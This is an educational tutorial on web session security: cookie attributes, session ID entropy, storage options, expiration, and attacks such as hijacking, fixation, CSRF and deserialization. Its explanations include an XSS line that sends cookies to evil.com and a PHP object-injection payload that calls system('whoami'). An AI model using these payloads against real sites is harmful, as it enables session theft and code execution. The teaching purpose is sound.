# Sessions — Maintaining Identity Across a Stateless Protocol

## The Problem

HTTP is stateless. Every request is independent — the server has no built-in
way to know that request #47 came from the same person who authenticated in
request #46. After you verify a password (topic 01), you need a mechanism
to remember "this client already proved who they are" without making them
send their password on every single request.

That mechanism is a **session**.

---

## What a Session Actually Is

A session is a mapping between a **random identifier** (session ID) and
**server-side state** (who the user is, when they logged in, their
permissions, etc.).

```
Client holds:    session_id = "abc123..."
Server holds:    "abc123..." → { user_id: 42, role: "admin", created: 1708012800 }
```

The client proves identity on every request by sending the session ID. The
server looks it up and knows who they are. The client never sees the actual
session data — only the opaque ID.

**This is fundamentally different from JWTs** (topic 03), where the client
holds the actual data. Sessions are server-side state with a client-side
pointer.

---

## How the Session ID Gets to the Client: Cookies

### The HTTP Cookie Mechanism

Cookies are the transport layer for sessions. Here's the exact protocol-level
exchange:

**Step 1 — Server sets the cookie:**

```http
HTTP/1.1 200 OK
Set-Cookie: session_id=abc123def456; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=86400
```

The browser receives this header, stores the cookie, and automatically
attaches it to every subsequent request to this domain.

**Step 2 — Client sends it back on every request:**

```http
GET /dashboard HTTP/1.1
Host: app.example.com
Cookie: session_id=abc123def456
```

The browser does this automatically. No JavaScript involved. No developer
action. The `Cookie` header is attached by the browser's HTTP stack before
the request leaves.

### Cookie Attributes — Each One Is a Security Control

#### `HttpOnly`

```
Set-Cookie: session_id=abc123; HttpOnly
```

The cookie is **invisible to JavaScript**. `document.cookie` will not include
it. `fetch()` and `XMLHttpRequest` will still send it (the browser handles
this at the network layer), but no script can read it.

**What it defeats**: XSS-based session theft. If an attacker injects
`<script>fetch('https://evil.com/?c=' + document.cookie)</script>` into
your page, they get nothing — the session cookie isn't in `document.cookie`.

**What it does NOT defeat**: The XSS can still make authenticated requests
from the user's browser (the cookie is sent automatically). The attacker
can't *steal* the session, but they can *use* it while the user's browser
is on the page. This is why XSS is still critical even with HttpOnly.

#### `Secure`

```
Set-Cookie: session_id=abc123; Secure
```

The cookie is only sent over HTTPS connections. The browser will not attach
it to any HTTP (unencrypted) request, even to the same domain.

**What it defeats**: Passive network eavesdropping. On an unencrypted
connection (coffee shop WiFi, compromised router), anyone can read HTTP
headers and steal the session ID. The `Secure` flag prevents the cookie
from ever touching an unencrypted connection.

**Edge case**: If your site is accessible on both HTTP and HTTPS, a
man-in-the-middle can intercept the HTTP version and inject a redirect to
HTTPS — but the cookie was never sent on the HTTP request, so it's safe.
This is why you also need HSTS (HTTP Strict Transport Security) to prevent
the HTTP request from happening at all.

#### `SameSite`

This attribute controls whether the cookie is sent on **cross-origin
requests** — requests initiated from a different domain than the one that
set the cookie.

**`SameSite=Strict`**:
Cookie is ONLY sent when the user navigates directly to your site. If the
user is on `evil.com` and clicks a link to `yourapp.com`, the cookie is NOT
sent on that first request. The user appears logged out until they navigate
again.

Problem: breaks legitimate use cases. If someone shares a link to your app
on Twitter and the user clicks it, they appear logged out on the landing
page.

**`SameSite=Lax`** (default in modern browsers):
Cookie is sent on top-level navigations (clicking links, typing URL) but
NOT on cross-origin subrequests (fetch, XHR, iframe, img). This is the
sweet spot for most apps.

```
User on evil.com clicks link to yourapp.com     → cookie IS sent (navigation)
evil.com runs fetch("yourapp.com/api/transfer") → cookie NOT sent (subrequest)
evil.com loads <img src="yourapp.com/api/...">  → cookie NOT sent (subrequest)
evil.com submits <form> to yourapp.com via POST → cookie NOT sent (unsafe method)
```

**`SameSite=None; Secure`**:
Cookie is always sent, even on cross-origin requests. Required for legitimate
cross-site scenarios (embedded widgets, SSO). Must be combined with `Secure`.
This is what pre-SameSite behavior was — and why CSRF was such a problem.

#### What "Same Site" Actually Means

"Site" in SameSite is defined by the **registrable domain** (eTLD+1):

```
app.example.com  and  api.example.com  → SAME site (both example.com)
example.com      and  example.org      → DIFFERENT sites
app.example.co.uk and api.example.co.uk → SAME site (co.uk is the eTLD)
```

This is different from "same origin" (which requires exact scheme + host +
port match). SameSite is more permissive than same-origin policy.

#### `Domain`

```
Set-Cookie: session_id=abc123; Domain=example.com
```

Without `Domain`: cookie is sent only to the exact host that set it
(`app.example.com` — not `api.example.com`).

With `Domain=example.com`: cookie is sent to `example.com` AND all
subdomains (`app.example.com`, `api.example.com`, `evil.example.com`).

**Security implication**: Setting `Domain` broadens the cookie's scope. If
any subdomain is compromised (or if users can create subdomains, like
`username.example.com`), they can read the session cookie. Omit `Domain`
unless you need cross-subdomain sessions.

#### `Path`

```
Set-Cookie: session_id=abc123; Path=/app
```

Cookie is only sent for requests whose path starts with `/app`. Sounds like
a security boundary, but it's not — JavaScript from `/other` can create an
iframe pointing to `/app` and access cookies through it. **Path is not a
security mechanism.** It's for organizational separation only.

#### Cookie Name Prefixes (`__Host-` and `__Secure-`)

A defense against subdomain attacks and cookie injection:

```
Set-Cookie: __Host-sid=abc123; Path=/; Secure; HttpOnly; SameSite=Lax
```

**`__Host-` prefix requirements** (enforced by the browser):
- Must have `Secure` flag
- Must NOT have a `Domain` attribute (locked to the exact host)
- Must have `Path=/`
- Must be set over HTTPS

If any requirement is violated, the browser **rejects the cookie entirely**.

**Why this matters**: Without `__Host-`, an attacker who controls a subdomain
(e.g., `evil.example.com`) can set a cookie for `example.com` (by setting
`Domain=example.com`), overwriting the session cookie. The `__Host-` prefix
makes this impossible — the cookie can't have a Domain attribute, so it's
locked to the exact origin.

**`__Secure-` prefix**: Weaker version. Only requires the `Secure` flag.
Prevents cookies from being set over HTTP but doesn't prevent subdomain
attacks.

```
__Host-sid    → strongest: exact host only, HTTPS only, no subdomain override
__Secure-sid  → medium: HTTPS only, but can still set Domain
sid           → weakest: no restrictions enforced by name
```

#### How the Browser's Cookie Jar Matches Cookies to Requests

When the browser makes a request, it decides which cookies to attach using
RFC 6265 matching:

```
1. Domain match:
   Cookie domain ".example.com" matches:
     example.com      ✓
     app.example.com  ✓
     api.example.com  ✓
   Cookie without Domain (host-only):
     app.example.com  ✓ (only the exact host)
     example.com      ✗

2. Path match:
   Cookie path "/app" matches:
     /app             ✓
     /app/settings    ✓
     /application     ✓ (prefix match, not directory match!)
     /other           ✗

3. Secure match:
   Cookie with Secure flag: only sent over HTTPS
   Cookie without Secure: sent over HTTP and HTTPS

4. SameSite match:
   Evaluated against the request's site relationship
   (covered in the SameSite section above)
```

**The path matching gotcha**: `/app` matches `/application` because it's
a prefix match, not a directory match. The spec says the cookie path must
be a prefix of the request path. This is why Path is not a security
boundary.

All matching cookies are sent in a single `Cookie` header, ordered by most
specific path first (longest path prefix), then by earliest creation time.

#### `Max-Age` and `Expires`

```
Set-Cookie: session_id=abc123; Max-Age=86400        // 24 hours from now
Set-Cookie: session_id=abc123; Expires=Thu, 16 Feb 2026 00:00:00 GMT
```

`Max-Age` takes precedence if both are set. If neither is set, the cookie
is a **session cookie** — it's deleted when the browser is closed (though
modern browsers with "restore tabs" may persist them).

**Security consideration**: Shorter is safer. A session that lives for 30
days means a stolen session ID is valid for 30 days. Balance user convenience
(not logging in every day) with risk.

---

## Session ID Generation

The session ID is the **only thing protecting the session**. If an attacker
can guess or predict it, they own the session.

### Entropy Requirements

A session ID must be generated from a CSPRNG with enough entropy that brute-
force guessing is infeasible.

**The math**: If your session ID has N bits of entropy and you have U active
sessions at any time, the probability of an attacker guessing a valid session
in one attempt is `U / 2^N`.

For 128 bits of entropy and 1 million active sessions:
```
P(guess) = 1,000,000 / 2^128 = 1 / 3.4 × 10^32
```

At 1 billion guesses per second, it takes ~10^16 years. This is sufficient.

**OWASP recommends at least 128 bits of entropy.** In practice, session IDs
are typically 128-256 bits, encoded as hex or base64.

### What "Entropy" Means Here

It's not about the length of the string — it's about how many possible values
exist and whether they're uniformly distributed.

Bad: `session_id = timestamp + user_id` → maybe 40 bits of entropy (predictable)
Bad: `session_id = Math.random().toString(36)` → ~52 bits, predictable PRNG
Good: `session_id = crypto.randomBytes(32).toString('hex')` → 256 bits, CSPRNG

The same CSPRNG chain from topic 01 applies: `crypto.randomBytes()` → OpenSSL
→ `getrandom()` → kernel entropy pool.

### Session ID Format

Common formats:

```
Hex:    "a3f8c9d1e4b7..."  (64 chars = 256 bits)
Base64: "o/jJ0eS3..."      (43 chars = 256 bits)
UUID v4: "550e8400-e29b-41d4-a716-446655440000" (122 bits of randomness)
```

UUID v4 is common but provides only 122 bits (6 bits are fixed version/variant
identifiers). Still sufficient, but raw random bytes are simpler and provide
full entropy for their length.

---

## Server-Side Session Storage

The session ID is a key. You need a data store to hold the value it maps to.

### In-Memory (Process Memory)

```javascript
const sessions = new Map();
sessions.set("abc123", { userId: 42, role: "admin", created: Date.now() });
```

**Pros**: Fastest possible — no network round-trip, no serialization.

**Problems**:
- **Lost on restart**: Process dies, all sessions die. Every user must log
  in again.
- **Can't scale horizontally**: If you have 3 app servers behind a load
  balancer, a session created on server 1 doesn't exist on server 2. User
  gets randomly logged out depending on which server handles their request.
- **Memory pressure**: Each session consumes RAM in your application process.
  100K sessions × 1KB each = 100MB. This competes with your application for
  memory.

**When it's okay**: Single-process development, prototyping, or apps that
will never need more than one server.

#### Sticky Sessions (Band-Aid for In-Memory)

A load balancer can route all requests from a client to the same server
(using client IP or a separate load balancer cookie). This "fixes" the
multi-server problem but:

- If that server goes down, all its sessions are lost
- Uneven load distribution (some servers get more sessions)
- Complicates deployment (can't just restart servers)
- You've coupled your infrastructure to your session strategy

### Redis

The most common production session store.

```
SET "sess:abc123" '{"userId":42,"role":"admin","created":1708012800}' EX 86400
```

**Why Redis works well for sessions:**

1. **In-memory with persistence**: Data lives in RAM (fast) but can be written
   to disk (survives restarts via RDB snapshots or AOF log).

2. **Built-in TTL**: `EX 86400` sets a 86400-second (24-hour) expiry. Redis
   automatically deletes expired keys. You don't need cleanup jobs.

3. **Atomic operations**: `SET` with `NX` (only if not exists) prevents race
   conditions in session creation. `GET` + `DEL` for logout is atomic with
   Lua scripting.

4. **Shared across processes**: All your app servers connect to the same Redis
   instance. Sessions are instantly available everywhere.

5. **Performance**: A Redis `GET` on a local network is ~0.1-0.5ms. A
   PostgreSQL `SELECT` is ~1-5ms. For something that runs on every single
   request, this matters.

**Redis internals for sessions:**

Redis stores small strings as embstr encoding (single contiguous allocation,
no pointer chasing). A session value under 44 bytes gets this optimization.
Larger values use raw SDS (Simple Dynamic String) with a header containing
length and capacity.

The TTL is tracked in a separate dict (expires dict). Redis uses a lazy +
periodic expiration strategy:
- **Lazy**: When a key is accessed, check if it's expired. If so, delete it.
- **Periodic**: A background task samples 20 random keys from the expires
  dict every 100ms, deleting expired ones. If >25% were expired, repeat
  immediately. This ensures memory is reclaimed even for keys nobody reads.

**Memory footprint**: Each session key in Redis uses ~150-200 bytes of
overhead (dict entry, two SDS strings, expires entry) plus the actual data.
For 1 million sessions: ~200MB overhead + data size.

### Database (PostgreSQL, MySQL)

```sql
CREATE TABLE sessions (
    id TEXT PRIMARY KEY,          -- session ID (CSPRNG-generated)
    data JSONB NOT NULL,          -- session payload
    created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
    expires_at TIMESTAMPTZ NOT NULL
);

CREATE INDEX idx_sessions_expires ON sessions (expires_at);
```

**Pros**: Durable, survives everything, can query sessions (find all sessions
for a user, count active sessions), integrates with your existing database
backups and monitoring.

**Cons**: Slower than Redis (~1-5ms per lookup), requires periodic cleanup
(`DELETE FROM sessions WHERE expires_at < now()`), adds load to your database
for every authenticated request.

**When to use**: When you already have a database and don't want to operate
Redis. When you need transactional consistency between session state and
application data. When session volume is moderate (<10K concurrent).

### Comparison

| Property | In-Memory | Redis | Database |
|----------|-----------|-------|----------|
| Latency | ~0.001ms | ~0.1-0.5ms | ~1-5ms |
| Survives restart | No | Optionally | Yes |
| Horizontal scaling | No (without sticky) | Yes | Yes |
| Built-in TTL | Manual | Native | Manual (cron/index) |
| Operational overhead | None | Run Redis | None (existing DB) |
| Memory model | Application heap | Dedicated | Disk-backed |

---

## Session Lifecycle

### Creation (Login)

```
1. Verify password (topic 01)
2. Generate session ID: crypto.randomBytes(32)
3. Store session: redis.set(sessionId, { userId, role, createdAt, lastActive })
4. Set cookie: Set-Cookie: sid=<sessionId>; HttpOnly; Secure; SameSite=Lax; Max-Age=86400
5. Return response
```

### Validation (Every Request)

```
1. Extract session ID from Cookie header
2. Look up session in store
3. If not found → 401 (session expired or invalid)
4. If found → check expiry, update lastActive timestamp
5. Attach user context to request (req.user = session.user)
6. Continue to route handler
```

This runs on **every authenticated request**. This is why session store
performance matters — a 5ms database lookup on every request adds up fast
under load.

### Renewal (Sliding Expiration)

Two expiration strategies:

**Absolute expiration**: Session dies exactly 24 hours after creation,
regardless of activity. User must re-authenticate. Used for high-security
applications (banking).

**Sliding expiration**: Session dies 24 hours after *last activity*. Every
request resets the clock. User stays logged in as long as they're active.
More user-friendly, but a compromised session stays alive indefinitely if
the attacker keeps using it.

**Hybrid** (best practice): Sliding expiration with an absolute maximum.
"Your session extends with activity, but you must re-authenticate after 7
days no matter what."

```javascript
const SESSION_IDLE_TIMEOUT = 24 * 60 * 60;    // 24h inactivity
const SESSION_ABSOLUTE_MAX = 7 * 24 * 60 * 60; // 7 days total

function validateSession(session) {
    const now = Date.now();
    if (now - session.createdAt > SESSION_ABSOLUTE_MAX) return false;  // absolute
    if (now - session.lastActive > SESSION_IDLE_TIMEOUT) return false; // idle
    session.lastActive = now;  // slide
    return true;
}
```

### Invalidation (Logout)

```
1. Extract session ID from cookie
2. Delete session from store: redis.del(sessionId)
3. Clear the cookie: Set-Cookie: sid=; Max-Age=0; HttpOnly; Secure; SameSite=Lax
4. Return response
```

**Both steps are required.** Deleting from the store means the session ID is
no longer valid server-side, even if the client still has the cookie. Clearing
the cookie means the browser stops sending it.

If you only clear the cookie but don't delete from the store, and the user
(or attacker) still has the session ID, they can manually re-attach it and
it still works.

If you only delete from the store but don't clear the cookie, the browser
keeps sending a dead session ID, which triggers a 401 on every request
until the cookie expires. The user has to clear cookies manually or wait.

---

## Session Attacks

### Session Hijacking

The attacker obtains a valid session ID belonging to another user.

**Vectors:**
1. **XSS**: Inject script that reads `document.cookie` (defeated by HttpOnly)
   or makes authenticated requests directly (not defeated by HttpOnly)
2. **Network sniffing**: Read the Cookie header from unencrypted traffic
   (defeated by Secure + HTTPS)
3. **Man-in-the-Middle**: Intercept and modify traffic (defeated by TLS +
   HSTS)
4. **Malware/browser extension**: Read cookies from the browser's cookie
   store (application-level defense is limited here)
5. **Physical access**: Open browser dev tools, read cookies

**Mitigation**: HttpOnly + Secure + SameSite + HTTPS + HSTS covers vectors
1-3. Vectors 4-5 are client-side compromise — the server can't fully defend
against a compromised client.

### Session Fixation

The attacker sets the session ID *before* the victim logs in.

**The attack:**
1. Attacker gets a valid session ID from the server (by visiting the login
   page)
2. Attacker tricks the victim into using that session ID (via URL parameter,
   cookie injection on a subdomain, or meta tag injection)
3. Victim logs in — the server associates the attacker's known session ID
   with the victim's authenticated identity
4. Attacker uses the same session ID — they're now authenticated as the victim

**The defense — session regeneration:**

On every privilege escalation (login, role change, sudo mode), generate a
**new** session ID:

```
1. User submits correct password
2. Delete old session: redis.del(oldSessionId)
3. Generate new session ID: crypto.randomBytes(32)
4. Create new session: redis.set(newSessionId, { userId, ... })
5. Set new cookie: Set-Cookie: sid=<newSessionId>; ...
```

The attacker's old session ID is now invalid. They can't use it even though
they know it.

**This is not optional.** Every authentication framework that's worth using
does session regeneration on login. If you're building sessions manually,
this is the step most people forget.

### Session Riding (CSRF)

Not an attack on the session itself, but on the automatic cookie behavior.

The browser sends cookies automatically on every request to the domain. An
attacker on `evil.com` can create a form that submits to `yourapp.com/api/
transfer?amount=1000&to=attacker`. The browser attaches the session cookie.
The server sees a valid session and processes the request.

**Defenses:**
1. **SameSite=Lax** (or Strict) — the primary modern defense. The browser
   won't send the cookie on cross-site POST requests.
2. **CSRF tokens** — the server generates a random token per session (or per
   form) and embeds it in the page. The form must include this token. An
   attacker on a different domain can't read your page to get the token
   (same-origin policy).
3. **Double-submit cookie** — set a CSRF token in both a cookie and a request
   header/body. The server verifies they match. An attacker can trigger the
   cookie to be sent but can't read it to set the header (same-origin policy).
4. **Check Origin/Referer header** — verify the request came from your own
   domain. Less reliable (headers can be missing) but useful as defense in
   depth.

### Session Binding

Tying a session to additional client fingerprints:

```javascript
session = {
    userId: 42,
    ip: "203.0.113.42",
    userAgent: "Mozilla/5.0...",
    fingerprint: hash(ip + userAgent)
}

// On each request:
if (hash(req.ip + req.userAgent) !== session.fingerprint) {
    destroySession();  // possible hijack
}
```

**Tradeoffs:**
- **IP binding**: Breaks for users on mobile (IP changes between WiFi and
  cellular), behind NATs (IP shared with others), or using VPNs (IP changes
  frequently). Can cause legitimate users to be logged out constantly.
- **User-Agent binding**: Rarely changes mid-session, low false-positive rate.
  But also easy for an attacker to spoof. Marginal security value.
- **TLS session binding** (RFC 5929): Binds the session to the specific TLS
  connection's channel binding data. Strongest option but poorly supported
  in practice.

Most production systems skip IP binding and rely on the cookie security
attributes instead. The false-positive rate of IP binding creates more
support tickets than the hijacking it prevents.

### Session Deserialization Attacks

If session data is serialized using a language-native format (PHP
`serialize()`, Java `ObjectInputStream`, Python `pickle`), an attacker
who can control session data can achieve **remote code execution**.

**PHP Object Injection:**

```php
// If session data is stored as PHP serialized:
$_SESSION['user'] = unserialize($cookie_value);

// Attacker crafts a serialized object:
// O:8:"Exploit":1:{s:4:"cmd";s:17:"system('whoami');"}
// If a class with a __destruct or __wakeup magic method exists that
// uses the "cmd" property, the code executes on deserialization.
```

**Java Deserialization (CVE-2015-4852, Apache Commons Collections):**

The attack that hit WebLogic, JBoss, Jenkins, and hundreds of Java
applications. If the application deserializes untrusted data, an attacker
constructs a serialized object chain (gadget chain) that triggers arbitrary
code execution when deserialized. The class doesn't need to be in your
code — it just needs to be on the classpath.

**The fix**: Never deserialize untrusted data using native serialization.
Use JSON for session storage. If you must use native serialization, sign
the session data with HMAC (like Rails does with `signed_cookies`) so
tampered data is rejected before deserialization.

**Node.js / Express**: `express-session` stores sessions as JSON by default,
which is safe from deserialization attacks. But custom session stores that
use `eval()`, `Function()`, or unsafe deserialization libraries are
vulnerable.

This attack class is why frameworks moved to JSON-based session storage
and signed cookies — not because JSON is inherently secure, but because
JSON parsers don't execute code during parsing.

---

## Concurrent Session Management

Should a user be allowed to have multiple active sessions? (logged in on
phone and laptop simultaneously)

### Allow Multiple (Most Common)

Store sessions independently. Each device gets its own session ID. This is
what users expect.

To let users manage their sessions:

```sql
-- Get all sessions for a user
SELECT id, created_at, last_active, user_agent, ip_address
FROM sessions
WHERE user_id = 42 AND expires_at > now();

-- Revoke a specific session (user clicks "log out" on their phone from laptop)
DELETE FROM sessions WHERE id = 'specific_session_id' AND user_id = 42;

-- Revoke all OTHER sessions ("log out everywhere else")
DELETE FROM sessions WHERE user_id = 42 AND id != 'current_session_id';

-- Revoke ALL sessions including current (password change, account compromise)
DELETE FROM sessions WHERE user_id = 42;
```

GitHub, Google, and most services show you a list of active sessions with
device info, location, and last activity — and let you revoke any of them.

### Limit Sessions

Some apps enforce a maximum (e.g., Netflix limits simultaneous streams).
This requires checking session count on login and either rejecting the new
login or terminating the oldest session.

---

## The Full Picture: Request Lifecycle with Sessions

```
BROWSER                         SERVER                          REDIS
  │                               │                               │
  │ GET /dashboard                │                               │
  │ Cookie: sid=abc123            │                               │
  │ ─────────────────────────────>│                               │
  │                               │                               │
  │                               │ -- middleware runs --          │
  │                               │ GET sess:abc123               │
  │                               │ ─────────────────────────────>│
  │                               │                               │
  │                               │ {"userId":42,"role":"admin",  │
  │                               │  "createdAt":...,             │
  │                               │  "lastActive":...}            │
  │                               │ <─────────────────────────────│
  │                               │                               │
  │                               │ validate expiry               │
  │                               │ update lastActive             │
  │                               │ SET sess:abc123 ... EX 86400  │
  │                               │ ─────────────────────────────>│
  │                               │                               │
  │                               │ req.user = { id: 42,          │
  │                               │              role: "admin" }  │
  │                               │                               │
  │                               │ -- route handler runs --      │
  │                               │ render dashboard for user 42  │
  │                               │                               │
  │ 200 OK                        │                               │
  │ <─────────────────────────────│                               │
```

Every authenticated request hits the session store. This is the fundamental
cost of server-side sessions — a lookup on every request. It's also the
fundamental advantage: **revocation is instant.** Delete the key, and the
next request fails. No waiting for expiry. No token blacklists. Just gone.

This is the key tradeoff that leads to the JWT discussion (topic 03): JWTs
eliminate the per-request lookup but lose instant revocation.

---

## Key Takeaways

| Concept | What You Must Know |
|---------|--------------------|
| Session = server-side state + client-side pointer | The client only holds an opaque ID |
| Cookie attributes are security controls | HttpOnly, Secure, SameSite — each defeats specific attacks |
| Session ID = CSPRNG, 128+ bits | The only thing protecting the session |
| Regenerate on login | Defeats session fixation — non-negotiable |
| SameSite=Lax | Primary CSRF defense in modern browsers |
| Sliding + absolute expiry | Balance UX and security |
| Redis is the standard session store | In-memory is dev-only, DB is fallback |
| Instant revocation is the superpower | Server-side sessions can be killed immediately |
